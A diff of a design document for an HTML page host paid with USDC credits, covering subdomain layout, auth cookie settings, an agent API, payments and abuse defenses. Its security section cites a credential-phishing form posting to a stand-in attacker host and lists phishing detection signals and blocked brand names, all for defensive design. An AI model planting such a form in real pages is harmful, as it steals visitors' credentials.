@@ -1,198 +1,314 @@
 # pa9es — Design Doc
 
-*Status: design settled, multi-tenant build not started. A working single-user prototype exists (see Appendix).*
+*Design only. Nothing built yet.*
 
 ---
 
 ## What it is
 
-A hosting service for single-page HTML. You sign up, write or upload an HTML file in a browser editor with live preview, name a path, and it's live at `yourslug.pages.mydomain.com`.
+Host a single HTML page. Sign up, upload or write your HTML, name it, and it's live at `yourname.pa9es.com/pagename`.
 
-Paid for with prepaid credits bought in USDC. No card, no subscription, no invoice on the 1st.
+Pay with credits bought in USDC. No card, no subscription.
 
-**Who it's for:** people who have one HTML file and want it on the internet in thirty seconds — landing pages, demos, AI-generated pages, one-off experiments. It is deliberately not a static site host: one page, one file, no build step, no git.
+For people who have one HTML file and want it online in thirty seconds — landing pages, demos, AI-generated pages, experiments. Not a static site host: one file per page, no build step, no git repo.
 
-**Why credits rather than a plan:** crypto has no pull payments. You cannot charge a wallet on a schedule. Prepaid is the model that actually fits the rails, not a preference.
+Built to be used by AI agents as much as by people. See [API and agents](#api-and-agents).
 
----
-
-## How it works
-
-1. Sign up with email, verify it. Account starts with 5 free credits.
-2. Create a page: name a path, upload an `.html` or start from a blank document.
-3. Edit in a split-pane editor — code left, live preview right. Save publishes immediately.
-4. The page is live at `slug.pages.mydomain.com`.
-5. Credits drain daily: a small standing charge per page, plus traffic.
-6. Buy more with USDC when the balance runs low. At zero, pages are suspended — not deleted — and the editor keeps working so you can pay and come back.
+**Why credits:** crypto can't do recurring charges. You can't bill a wallet monthly. Prepaid is the only model that fits.
 
 ---
 
-## Architecture
+## URLs
 
-### Two origins
+Everything on one domain for now.
 
-| Host | Serves | Notes |
-|---|---|---|
-| `app.mydomain.com` | The app: auth, dashboard, editor, billing | Session cookie scoped here only |
-| `*.pages.mydomain.com` | User HTML | Never sets a cookie, never returns CORS headers |
-
-This split is the entire security model. Path-based hosting (`mydomain.com/slug`) would put user JavaScript on the app's origin, where it could call the API with the visitor's session cookie attached. No header fixes that — `httpOnly` stops JS reading the cookie but the browser still sends it, and `SameSite` doesn't apply to a same-site request. Separate origins remove the problem by construction.
-
-Wildcard DNS `*.pages` → the VPS. Wildcard cert via Let's Encrypt **DNS-01** (HTTP-01 cannot issue wildcards). Requests hit the app with the slug in the `Host` header; middleware rewrites by host.
-
-### Data model
-
-Balances are held in **units**: 1 credit = 1,000 units, the way money is held in cents. Metering divides evenly at that resolution so nothing is lost to rounding.
-
-| Table | Purpose |
+| URL | What |
 |---|---|
-| `users` | email, password hash, verified_at, `balance_units`, suspended_at |
-| `sessions` | hashed token, expires_at — a table, not a stateless cookie, so sessions can be revoked |
-| `pages` | slug (PK, globally unique — it's a hostname), user_id, html, status |
-| `revisions` | last 20 versions per page |
-| `ledger` | user_id, delta_units, reason, ref, **unique(reason, ref)** |
-| `invoices` | chain, token, amount, destination, reference, status |
-| `views_daily` | (slug, day) → count |
-| `meter_runs` | day PK, claims the nightly job |
+| `www.pa9es.com` | Marketing |
+| `www.pa9es.com/app` | User dashboard + editor |
+| `www.pa9es.com/superadmin` | Admin (me) |
+| `alice.pa9es.com/blog` | A user's page |
 
-The ledger is the source of truth; `balance_units` is a cache written in the same transaction. The unique constraint on `(reason, ref)` makes webhook replays, re-run metering jobs, and reprocessed blocks all no-ops.
+**Username is the subdomain, page name is the path.** So only usernames are globally unique. Everyone can have a page called `blog`. Same as GitHub Pages.
 
-### Serving a page
+DNS: `*.pa9es.com` → the server, plus an explicit `www` record. Cloudflare's free Universal SSL covers the wildcard at one level.
 
-Host → slug → page and owner status from a small in-process cache (30s TTL, invalidated on save). Suspended owner gets a 402 placeholder. Otherwise the HTML with `no-store` and `nosniff`.
+**Rules that fall out of this:**
 
-Views go into an in-memory buffer flushed every few seconds as an upsert — not one database write per request. Losing a few counts on a crash is acceptable; it errs in the user's favour.
+- Usernames are hostnames: lowercase letters, numbers, hyphens, max 63 chars. Check at signup.
+- Can't do `page.user.pa9es.com` — wildcards only match one label. Path it is.
+- Reserve before launch: `www`, `app`, `api`, `admin`, `mail`, `cdn`, `static`, `status`, `docs`, `help`, `blog`, plus brand names like `paypal`, `metamask`, `coinbase`. Also block lookalikes — `paypa1`, `rnetamask`, Cyrillic characters.
+
+### One rule that keeps this safe
+
+**No third-party scripts on `www.pa9es.com`. Ever.**
+
+Marketing and the dashboard share an origin. If you paste in a chat widget or ad pixel and it gets compromised, it runs next to the session cookie and can act as any logged-in user.
+
+Enforce it with `script-src 'self'` on `www`, and use your own server-side analytics instead of a tag. Moving the dashboard to `app.pa9es.com` later is a DNS record and a middleware branch, so this isn't a trap.
+
+### What one domain costs you
+
+If a user's page gets Safe Browsing flagged at the **domain** level, the marketing site and login go down too. Usually flags are per-hostname and only kill that user, but the bad case exists.
+
+Compensate: no JS or forms until a user has paid, send email from `mail.pa9es.com` with its own SPF/DKIM/DMARC, and be able to suspend a page in under a minute from your phone. Register in Search Console so Google warns you first.
+
+Keep `PAGES_HOST` in config, never hardcoded. Buying a second domain later is then a config change plus permanent 301s from the old URLs.
 
 ---
 
-## Pricing and metering
+## Username changes
 
-| Constant | Value |
+Users can rename, as long as the new name is free. Two rules make it safe:
+
+**Old URLs keep working forever.** `oldname.pa9es.com/*` → 301 → `newname.pa9es.com/*`. Wildcard DNS already resolves the old name, so this is just a lookup table.
+
+**A released name is never re-registered — if it ever published a page.** This is the important one. If alice renames and bob claims `alice`, bob inherits her links, her traffic and her reputation. That's a free impersonation setup, and GitHub hit exactly this problem. Retired names stay retired.
+
+Also:
+
+- One change per 30 days.
+- Charge credits for it (100 is reasonable) as an extra brake.
+- Run the reserved list and homoglyph checks on rename, not just signup.
+- Bust the host → user cache.
+- Audit log it.
+
+Table: `username_history(username, user_id, released_at)`. Never delete rows.
+
+---
+
+## Auth
+
+**Better Auth.** It owns `users` and `sessions`, so those aren't in the schema below.
+
+Keep `credits` in your own table keyed by user id — not as a field on Better Auth's user model. You don't want billing tangled up in auth library migrations.
+
+Plugins used:
+
+| Plugin | For |
 |---|---|
-| 1 credit | 1,000 units |
-| Base charge | 33 units per live page per day (≈1 credit per page per month) |
-| Traffic | 1 unit per view (1 credit = 1,000 views) |
-| Signup bonus | 5 credits |
-| Grace | 3 credits below zero before suspension |
+| `username` | Usernames, availability check, rename |
+| `admin` | Roles, ban, impersonate |
+| `apiKey` | Agent access. Has per-key rate limits and a remaining-request counter built in |
+| `twoFactor` | TOTP step-up for superadmin |
+| `openAPI` | Spec generation |
 
-A page needs roughly 33 views a day before traffic outweighs the base charge, so the story is "hosting is basically free, traffic is what costs." The base charge exists to cover storage and to make abandoned pages disappear on their own.
+### Two settings that matter
 
-**Nightly job** (00:10 UTC, bills the previous day):
+**`crossSubDomainCookies` must stay off.** Turning it on sets `Domain=.pa9es.com`, which hands the session cookie to every user page — exactly the attack the domain design prevents. This is the single most dangerous config flag in the project.
 
-1. Claim the day in `meter_runs` — a double-triggered cron does nothing.
-2. Base charge across live pages.
-3. Traffic charge from `views_daily`.
-4. One ledger row per user, per day, per reason, `ref` = the date.
-5. Recompute balances, suspend anyone past grace, email warnings.
+**The session cookie name must start with `__Host-`.** Better Auth names cookies `${prefix}.${name}` with a configurable `cookiePrefix`. Needs `Secure`, `Path=/`, and no `Domain`. Verify in devtools once and write a test — on a single domain this is what stops `evil.pa9es.com` shadowing your session.
 
-Per-day rows rather than per-event rows keep write volume bounded and the whole run replayable.
+---
 
-**Lifecycle:** above zero → live. Zero to −3 credits → live, with warning emails. Below → 402 placeholder, editor still works. HTML purged after 60 suspended days, row retained.
+## API and agents
+
+The site should be usable by an AI agent without a human in the loop.
+
+### MCP server
+
+The main feature. Tools: `create_page`, `update_page`, `publish`, `list_pages`, `get_balance`.
+
+An agent that just generated an HTML page can publish it in the same breath — no copy-paste. Since AI-generated pages are a core use case, this is the product, not a nice-to-have.
+
+### API rules
+
+- **API keys, not session cookies.** Scoped, revocable, with a per-key spend cap. An agent in a retry loop can drain a balance fast.
+- **Idempotency keys on every billable write.** Agents retry on timeouts. Without this, one publish charges 100 credits twice. Client sends `Idempotency-Key`, you store it and replay the original response.
+- **Return cost in the response.** `credits_charged` and `credits_remaining` on every billable call, plus a `dry_run` flag that returns the price without doing it. Agents can't budget against prices they can't see.
+- **Errors built for machines.** Stable code, human message, `docs_url`. Agents recover from structured errors and flail on prose.
+- **Boring REST.** No GraphQL, no clever pagination.
+
+### Docs
+
+- Markdown, served as markdown.
+- `/llms.txt` at the root.
+- OpenAPI spec at a stable URL.
+
+### Caution
+
+An API that publishes HTML at scale is an abuse vector at scale. Require a verified email before issuing API keys, and lean on the "no JS or forms until paid" rule — it does more work here than anywhere else.
+
+---
+
+## Pricing
+
+**1 USD = 100 credits.** So 1 credit = 1 cent.
+
+| Action | Cost |
+|---|---|
+| Publish a page | 100 credits ($1) |
+| Republish (new version) | 10 credits |
+| Save a draft / commit | Free |
+| Change username | 100 credits |
+| Signup bonus | 100 credits (first page free) |
+
+Fixed price, not billed by time. **This means no nightly billing job, no suspensions, no grace periods.** Balance only changes when the user does something. Big simplification — build it this way.
+
+Store credits as plain integers. If per-view billing later needs fractions, multiply every balance by 1000 in one migration.
+
+The free first page publishes at the **unverified tier** — no JS, no forms. Paying unlocks them. That keeps payment as the anti-abuse gate.
+
+**Put a dormancy clause in the ToS now:** no views in 12 months → archived, restore for credits. One-time payment for forever hosting is an open-ended promise otherwise, and you can't add this rule later without emailing everyone.
+
+Per-view billing comes later.
+
+---
+
+## Version control
+
+Single file, so no branches, no merges, no trees. Just:
+
+- `blobs` — sha256 → gzipped HTML. Same content stored once.
+- `commits` — id, page_id, parent_id, blob_hash, message, created_at.
+- `pages.live_commit` — a pointer. Publishing moves it.
+
+Revert = new commit pointing at an old blob. Never rewrite history. Diffs computed at read time with jsdiff.
+
+Don't use real git. A parent pointer and a hash is the whole thing.
+
+**Commits are free, publishing costs.** This matters because live editing and the AI editor will produce many versions. Charging per commit makes the AI editor unusable. Charging to move the live pointer is also honest — serving is what actually costs you.
+
+---
+
+## Data model
+
+Better Auth owns `user`, `session`, `account`, `verification`, `apikey`. Yours:
+
+| Table | What |
+|---|---|
+| `profiles` | user_id, credits, tier |
+| `username_history` | username, user_id, released_at — never deleted |
+| `pages` | user_id, path, live_commit, `UNIQUE(user_id, path)` |
+| `commits` | page_id, parent_id, blob_hash, message |
+| `blobs` | sha256 → gzipped HTML, plus scan verdict and extracted title |
+| `ledger` | user_id, delta, reason, ref, `UNIQUE(reason, ref)` |
+| `invoices` | chain, token, amount, reference, status |
+| `idempotency_keys` | key, user_id, response, expires_at |
+| `views_daily` | (page_id, day) → count |
+| `audit_log` | admin actions |
+
+The ledger is the truth. `profiles.credits` is a cache written in the same transaction. Never write it directly.
+
+That `UNIQUE(reason, ref)` makes replayed payments and re-run jobs into no-ops.
+
+Scan results live on the blob, keyed by hash — so identical content is never rescanned, and reverting to an approved version is instant.
+
+---
+
+## Storage
+
+**Store HTML as text in the database**, keyed by content hash. At 512KB max, SQLite handles this better than the filesystem does for small files, and you back up one file instead of a database plus a directory that can drift out of sync with it.
+
+**Never parse HTML when serving.** Serving is: host → username → path → live commit → blob → bytes, untouched. Rewriting on the way out is slow and breaks pages in weird ways.
+
+Parse at **write** time and store the results: title, size check, external resources, whether it has scripts or forms, scan verdict.
+
+The hash indirection makes moving to R2 later a drop-in swap.
 
 ---
 
 ## Payments
 
-**MVP: EVM only. Base, native USDC.** One viem adapter, one receiver contract, one idempotency key. Adding Arbitrum or Polygon later is a config row — chain id, RPC, token address.
+**EVM only for MVP. Base, USDC.**
 
-**Flow**
+1. User picks a pack. Server creates an invoice with the amount in base units **as a string** (6 decimals, never a float).
+2. Payment page shows a QR and an EIP-681 link. State the chain and token loudly.
+3. User pays a receiver contract: `pay(bytes32 invoiceId, uint256 amount)` emits an event. One treasury, no address sweeping.
+4. A **separate watcher process** — not the request path — tracks `last_processed_block`. Websocket for speed, block scan for correctness: the scan catches what the socket dropped during a restart. Credit at the `finalized` block tag.
+5. Credit in one transaction: ledger row keyed on `(chain_id, tx_hash, log_index)`, balance bump, invoice settled. That tuple is unique on-chain, so replays and reorgs collapse to one credit.
+6. A reconciler re-scans recent blocks every few minutes to close gaps.
 
-1. User picks a pack. Server creates an invoice: chain, token, amount in base units **as a string** (6 decimals, never a float), destination, reference, expiry.
-2. Payment page shows a QR and an EIP-681 deep link, with the chain and token stated loudly.
-3. User pays a receiver contract: `pay(bytes32 invoiceId, uint256 amount)` emits an event. USDC's ERC-3009 `transferWithAuthorization` makes it one signature instead of approve-then-pay. One treasury, no address sweeping.
-4. A **separate watcher process** — never the request path — keeps a `last_processed_block` cursor. Websocket subscription for latency, block scan for correctness: the scan is what catches events dropped during a restart. Credit at the `finalized` block tag.
-5. Credit in one transaction: ledger insert keyed on `(chain_id, tx_hash, log_index)`, balance bump, invoice settled, suspension lifted. That tuple is unique on-chain, so replays and reorg-reinclusion collapse to a single credit.
-6. A reconciler re-scans the last N blocks every few minutes to close gaps.
-
-**Packs:** 100 credits / $5 · 500 / $20 · 2,000 / $70. Stablecoins mean no rate lock and no volatility window.
-
-**Build for the mess from day one.** Wrong chain, wrong token, underpayment, overpayment, payment after expiry — all routine. Watch the treasury for *any* inbound transfer and drop unmatched ones into an `orphan_payments` table with an admin resolution view. Credit partial payments proportionally and say so at checkout.
+**Expect mistakes.** Wrong chain, wrong token, underpayment, late payment — all routine. Watch the treasury for any inbound transfer and put unmatched ones in `orphan_payments` with an admin screen. Credit partial payments proportionally, and say so at checkout.
 
 Two hard rules: never credit from a client-side "I paid" button, and keep the treasury key off the web server. The watcher only needs read-only RPC.
 
 ---
 
-## Security and abuse
-
-### Cookie isolation
-
-- Session cookie uses the **`__Host-`** prefix — browsers reject it unless it has no `Domain` attribute and arrived over HTTPS from that exact host, so a sibling subdomain can't shadow it.
-- Submit `pages.mydomain.com` to the **Public Suffix List**, so nothing under it can set cookies on the parent.
+## Security
 
 ### JavaScript: sandboxed, not banned
 
-Enforced by header, never by sanitizing HTML — sanitizers lose the mXSS arms race, a CSP doesn't.
+Enforce with a header, never by sanitizing HTML. Sanitizers lose the mXSS arms race; a CSP doesn't.
 
 ```
 Content-Security-Policy: sandbox allow-scripts allow-popups
 ```
 
-Applied to a top-level document, this gives the page an **opaque origin**: scripts run, but the page cannot set cookies, use `localStorage`, register a service worker, or fetch same-origin. The product survives; the weapon doesn't.
-
-**Tiered by trust:**
+On a top-level document this gives the page an **opaque origin**: scripts run, but the page can't set cookies, use localStorage, register a service worker, or fetch same-origin.
 
 | Tier | Policy |
 |---|---|
-| Unverified | `script-src 'none'`, `form-action 'none'` |
-| Verified email | Sandboxed JS |
-| Has purchased credits | Sandboxed JS, forms allowed |
+| Free / unverified | `script-src 'none'`, `form-action 'none'` |
+| Has paid | Sandboxed JS, forms allowed |
 
-Requiring a real on-chain payment before JS and forms unlock destroys bulk-abuse economics better than any classifier — and a payment address is an identity anchor that's harder to churn than a disposable inbox.
+Note banning JS wouldn't stop phishing anyway — that's a plain `<form action="https://attacker/">`. `form-action` is the bigger lever.
 
-Note that banning JS wouldn't stop phishing anyway: credential theft is a plain `<form action="https://attacker/">`. `form-action` is the bigger lever than `script-src`.
+### Scanning
 
-### Screening
+Run all three on **every publish**, not just the first. Version control makes publish-clean-then-swap a one-click attack.
 
-- **Slug blocklist** — reject or flag `paypal`, `metamask`, `coinbase`, `wallet`, `login`, `verify`, `airdrop`, `claim`. Costs nothing, prevents a large share of phishing before it exists.
-- **AI scan on every save, not just create** — the editor makes publish-clean-then-swap a one-click attack. High confidence blocks and queues for human review; middle publishes with JS disabled; low publishes. Never terminate on a model score alone.
-- **Google Safe Browsing, inbound first** — register the pages host in Search Console so Google tells you when you've been flagged. Use the Lookup API on outbound links too, but it's a floor, not a wall: a fresh phishing page is on no list yet.
-- **Abuse reporting at a fixed app URL**, plus an `abuse@` mailbox and `/.well-known/security.txt`. Not injected into user pages — that breaks layouts and is spoofable. What matters is the triage SLA behind it.
-- **Interstitials only where they earn it** — first visit to a page from an unverified account, or one the scanner flagged. Not a modal on every pageview; users dismiss those reflexively and it wrecks the product.
+1. **Cheap checks first** — parse at upload. Off-site form actions, `eth_requestAccounts`, obfuscated JS, brand names, unknown iframes. Free and instant.
+2. **Safe Browsing Lookup** on outbound links. Also register the domain in Search Console — being told when *you're* flagged is the more valuable direction.
+3. **AI scan for intent** — brand impersonation, credential or seed-phrase requests. Triage, not a gate: high confidence blocks and queues for review, middle publishes with JS off, low publishes clean. Never ban on a model score alone.
 
-**Response speed beats prevention.** Suspending a single page in under a minute, from a phone, matters more than any scanner. Something always gets through.
+Cloudflare isn't a content scanner. It gives you WAF, rate limiting, bot management, DDoS protection, and R2 later.
+
+**Speed beats prevention.** Something always gets through. Suspending one page in a minute matters more than any scanner.
+
+---
+
+## Superadmin
+
+Everything under `/superadmin/*` and `/api/superadmin/*`, with one middleware check per prefix. **Guard by location, not by memory** — a new endpoint is then protected by where the file lives, not by remembering to add a check. Never render admin-only bits inside normal user pages.
+
+- **TOTP step-up** to enter, granting elevated status for ~30 minutes.
+- **A separate account** from the one you use to test the product.
+- **Credit adjustments go through the ledger** with `reason='admin_adjustment'`, your admin id, and a written justification. You're touching people's money.
+- **Audit log everything**, including reading a user's page content and any impersonation. Better Auth's admin plugin gives you the mechanism, not the paper trail.
+
+Don't give it its own subdomain — certificate issuance is published to public CT logs, and people scan those for admin panels.
+
+Views needed: users list, pages list with scan verdicts, review queue for flagged content, orphan payments, per-page suspend.
 
 ---
 
 ## Analytics
 
-Server-side, derived from the request. Pages with `script-src 'none'` can't run a beacon — which lands in a good place: no JS, no cookies, no persistent identifier, no consent banner. "Privacy-first analytics, included" is a real line on the pricing page and costs nothing, because the views are being counted for billing regardless.
+Server-side, from the request itself. Pages with `script-src 'none'` can't run a beacon — which works out well: no JS, no cookies, no consent banner. "Privacy-first analytics, included" is a real selling point that costs nothing.
 
-Shown per page: views per day, top referrers, country (from IP, discarded after aggregation), device class, and a **bot vs. human split**.
+Per page: views per day, top referrers, country (from IP, discarded after aggregating), device type, and a **bot vs. human split**.
 
-That last one isn't a nicety. Crawlers and scanners can be most of the traffic to a small page, and every hit currently drains a customer's credits. Untreated, that's a billing defect, not an analytics gap — so bot classification is required anyway, and showing billed alongside filtered counts is what makes credit consumption legible enough to trust.
+That last one isn't optional once per-view billing exists. Crawlers can be most of a small page's traffic, and charging users for bot hits is a billing bug, not an analytics gap.
 
-**Out of scope:** uniques, sessions, funnels, events, retention. All need identity, which means cookies or fingerprinting and the consent obligations that follow.
+Skip uniques, sessions, funnels, retention. All need identity, which means cookies and consent.
 
-**Retention:** raw rows ~48 hours for debugging, then rolled up to `(slug, day, dimension) → count` as part of the nightly billing job.
+Keep raw rows ~48 hours, then roll up to `(page_id, day, dimension) → count`.
 
 ---
 
 ## Later
 
-| Area | Next step |
+| Area | Next |
 |---|---|
-| Chains | Solana (Solana Pay `reference` makes matching clean), then Tron on demand — note Tron means **USDT**, since Circle discontinued USDC there in 2024 |
-| Custom domains | Users pointing their own domains at pages. Wildcards can't cover this; each needs a cert on demand. A good reason to run Caddy rather than nginx from the start |
-| Scale | Batch view writes → Redis counters → Postgres → CDN in front of the pages host |
-| Analytics | Approximate uniques via a daily-rotating salted hash, salt discarded nightly |
-| Product | Multiple pages per project, assets beyond a single HTML file, page templates |
+| Billing | Per-view charging |
+| Editor | Live edit, preview, AI editor |
+| Vanity URLs | `project.pa9es.com` as a premium purchase — the global namespace is now unused, so sell it |
+| Second domain | Move pages to `pa9es.dev` when there's revenue. Keep 301s from old URLs forever |
+| Chains | Solana, then Tron on demand — Tron means **USDT**, since Circle dropped USDC there in 2024 |
+| Custom domains | Users' own domains. Needs per-hostname certs; Caddy's on-demand TLS handles it |
+| Scale | Batch view writes → Redis → Postgres → CDN |
 
-**Scaling ceiling:** SQLite on one VPS carries this into the low millions of views a month. The day a CDN goes in front of the pages host, view counting has to move to CDN log ingestion — requests stop reaching the origin.
+**Ceiling:** SQLite on one VPS handles low millions of views a month. Once a CDN sits in front, requests stop reaching you and view counting has to move to CDN logs.
 
 ---
 
 ## Open questions
 
-- **Do credits expire?** Never expiring is cleanest to sell, but unspent prepaid balances raise unclaimed-property questions in some jurisdictions.
-- **Money transmission / AML.** Selling prepaid credits for crypto may trigger registration depending on where you and your users are.
-- **Tax.** Receiving stablecoins is generally a taxable event at the fiat value on the day.
-- **DMCA agent and notice-and-takedown procedure** — worth more than any disclaimer popup.
-- **Hosting provider tolerance.** Some null-route an IP on the first abuse complaint. Worth researching before launch, not after.
+For a lawyer or accountant, flagged now so they aren't a surprise:
 
-*The five above are lawyer and accountant questions, flagged here so they aren't discovered late.*
-
----
-
-## Appendix — prototype
-
-A working single-tenant version was built earlier: Next.js 15 App Router, SQLite, password auth, CodeMirror editor with debounced `srcdoc` preview, page CRUD, revision history. It predates the multi-tenant decisions above — no accounts, no credits, path-based serving — so treat it as a reference for the editor and serving layer rather than a starting point for the platform.
+- **Do credits expire?** Never expiring sells better, but unspent prepaid balances raise unclaimed-property issues in some places.
+- **Money transmission / AML.** Selling prepaid credits for crypto may need registration depending on where you and your users are.
+- **Tax.** Receiving stablecoins is usually a taxable event at that day's fiat value.
+- **DMCA agent and takedown process.** Worth more than any disclaimer popup.
+- **Host tolerance.** Some providers null-route your IP on the first abuse complaint. Check before launch.
